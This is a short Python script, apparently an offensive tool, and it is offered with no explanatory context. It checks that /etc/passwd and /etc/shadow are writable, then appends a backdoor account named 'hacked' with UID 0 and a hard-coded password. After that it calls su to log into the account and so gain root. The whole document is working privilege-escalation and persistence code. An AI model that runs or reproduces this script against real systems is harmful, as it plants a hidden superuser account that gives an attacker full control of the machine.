# File: passwd.py
import crypt
import os
import subprocess

username = "hacked"
password = "password123"
shell = "/bin/bash"
home = "/root"

print("[*] Checking file permissions...")
if not os.access("/etc/passwd", os.W_OK):
    print("[-] /etc/passwd is not writable")
    exit(1)
if not os.access("/etc/shadow", os.W_OK):
    print("[-] /etc/shadow is not writable")
    exit(1)

print("[*] Generating password hash...")
hashed = crypt.crypt(password, crypt.mksalt(crypt.METHOD_SHA512))
print(f"[*] Generated hash: {hashed}")

passwd_entry = f"{username}:x:0:0:root:{home}:{shell}\n"
shadow_entry = f"{username}:{hashed}:19485:0:99999:7:::\n"

print("[+] Writing to /etc/passwd and /etc/shadow...")
with open("/etc/passwd", "a") as f:
    f.write(passwd_entry)
with open("/etc/shadow", "a") as f:
    f.write(shadow_entry)

print("[+] Wrote to /etc/passwd and /etc/shadow")
print("[*] Trying to switch to hacked user...")
subprocess.call(["su", username])
